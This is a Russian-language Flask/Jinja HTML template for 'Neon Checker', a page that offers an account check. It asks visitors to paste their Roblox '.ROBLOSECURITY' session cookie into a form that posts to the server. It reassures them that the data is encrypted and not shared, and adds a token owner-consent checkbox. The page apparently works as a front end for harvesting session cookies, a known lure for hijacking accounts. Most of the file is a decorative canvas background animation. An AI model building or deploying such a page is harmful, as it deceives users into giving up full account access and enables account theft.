<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Neon Checker — Проверка аккаунта</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    :root{ --bg:#060014; --a1:168,64,255; --a2:114,91,255; }
    html,body{height:100%}
    body{ margin:0; background: var(--bg); color:#e8e8ff; font-family:Inter,system-ui,Arial; overflow-x:hidden; }
    .bg-layer{ position:fixed; inset:0; pointer-events:none; z-index:0; }
    .card{ background:linear-gradient(180deg,rgba(255,255,255,0.024),rgba(255,255,255,0.014)); border:1px solid rgba(255,255,255,0.06); backdrop-filter: blur(10px); box-shadow:0 14px 60px rgba(0,0,0,0.65); }
    .neon{ background:linear-gradient(90deg, rgba(var(--a1),1), rgba(var(--a2),1)); box-shadow:0 16px 50px rgba(var(--a1),0.2); color:#fff; }
    textarea:focus{ outline:none; border-color:rgba(255,255,255,0.12); box-shadow:0 10px 30px rgba(168,64,255,0.18); }
  </style>
</head>
<body>
  <!-- Живой фон -->
  <canvas id="bg" class="bg-layer"></canvas>

  <div class="relative z-10 max-w-3xl mx-auto px-6 py-24">
    <header class="mb-8">
      <h1 class="text-4xl font-extrabold tracking-tight">Neon <span style="color:rgb(168,64,255)">Checker</span></h1>
      <p class="mt-2 text-slate-300">Проверь свой аккаунт быстро и безопасно.</p>
    </header>

    {% with messages = get_flashed_messages(with_categories=true) %}
      {% if messages %}
        <div class="space-y-3 mb-4">
          {% for category, msg in messages %}
            <div class="p-3 rounded card {{ 'border-red-400 bg-red-900/20 text-red-200' if category=='danger' else 'border-yellow-400 bg-yellow-900/12 text-yellow-200' }}">{{ msg }}</div>
          {% endfor %}
        </div>
      {% endif %}
    {% endwith %}

    <form action="{{ url_for('check') }}" method="post" class="p-6 rounded-lg card">
      <label class="block text-sm font-medium text-slate-200 mb-2">Куки / Токен</label>
      <textarea name="cookie" rows="6" required class="w-full p-3 rounded bg-transparent border border-white/10 text-slate-100 placeholder-slate-400" placeholder=".ROBLOSECURITY=..."></textarea>

      <label class="flex items-center gap-2 mt-4 mb-6">
        <input type="checkbox" name="owner_confirm" class="w-4 h-4 rounded border-white/20" />
        <span class="text-sm text-slate-300">Подтверждаю, что аккаунт мой или у меня есть разрешение владельца.</span>
      </label>

      <div class="flex items-center justify-between">
        <button class="neon px-5 py-2 rounded-full font-semibold transition-transform hover:-translate-y-0.5">Проверить</button>
        <div class="text-xs text-slate-400">Данные шифруются и не передаются третьим лицам.</div>
      </div>
    </form>

    <footer class="mt-8 text-sm text-slate-400">Совет: используй тестовый аккаунт для демонстрации.</footer>
  </div>

  <script>
    // Неоновая анимация: мягкие «облака» + частицы
    (() => {
      const c = document.getElementById('bg'), x = c.getContext('2d');
      let W = c.width = innerWidth, H = c.height = innerHeight;

      const blobs = Array.from({length: 6}).map(()=>({
        x: Math.random()*W, y: Math.random()*H,
        r: 200 + Math.random()*260,
        vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.25,
        h: Math.random()<.5
      }));

      const particles = Array.from({length: Math.max(50, Math.min(140, Math.floor(W*H/18000)))}).map(()=>({
        x: Math.random()*W, y: Math.random()*H,
        vx: (Math.random()-0.5)*0.4, vy:(Math.random()-0.5)*0.4,
        a: 0.06 + Math.random()*0.12, s: 0.8 + Math.random()*2.2
      }));

      function draw(){
        x.clearRect(0,0,W,H);

        blobs.forEach(b=>{
          b.x+=b.vx; b.y+=b.vy;
          if(b.x<-200) b.x=W+200; if(b.x>W+200) b.x=-200;
          if(b.y<-200) b.y=H+200; if(b.y>H+200) b.y=-200;
          const g = x.createRadialGradient(b.x,b.y, b.r*0.1, b.x,b.y,b.r);
          g.addColorStop(0, `rgba(168,64,255,${b.h?0.25:0.15})`);
          g.addColorStop(1, 'rgba(0,0,0,0)');
          x.fillStyle = g; x.fillRect(b.x-b.r, b.y-b.r, b.r*2, b.r*2);
        });

        x.globalCompositeOperation='lighter';
        particles.forEach(p=>{
          p.x+=p.vx; p.y+=p.vy;
          if(p.x<0) p.x=W; if(p.x>W) p.x=0;
          if(p.y<0) p.y=H; if(p.y>H) p.y=0;
          x.fillStyle = 'rgba(255,255,255,'+p.a+')';
          x.beginPath(); x.arc(p.x, p.y, p.s, 0, Math.PI*2); x.fill();
        });
        x.globalCompositeOperation='source-over';

        requestAnimationFrame(draw);
      }
      addEventListener('resize', ()=>{ W=c.width=innerWidth; H=c.height=innerHeight; });
      requestAnimationFrame(draw);
    })();
  </script>
</body>
</html>
